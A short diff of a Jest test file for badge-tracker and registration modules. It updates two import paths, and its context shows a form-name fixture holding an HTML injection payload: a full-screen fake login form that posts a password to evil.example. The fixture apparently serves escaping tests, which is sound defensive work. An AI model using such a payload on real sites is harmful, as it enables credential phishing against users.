@@ -27,8 +27,8 @@ jest.mock('../../spa/utils/PermissionUtils.js', () => ({
 jest.mock('../../spa/utils/BadgeLabelUtils.js', () => ({ badgeLabel: () => 'Badge' }));
 jest.mock('../../spa/utils/DateUtils.js', () => ({ formatDateShort: (value) => value }));
 
-const { BadgeTracker } = require('../../spa/badge_tracker.js');
-const { TimeSinceRegistration } = require('../../spa/time_since_registration.js');
+const { BadgeTracker } = require('../../spa/modules/badges/BadgeTracker.js');
+const { TimeSinceRegistration } = require('../../spa/modules/participants/TimeSinceRegistration.js');
 
 const FORM_NAME = '<form action="https://evil.example/x" style="position:fixed;inset:0">'
   + '<input name="password" type="password"><button>Reconnexion</button></form>';
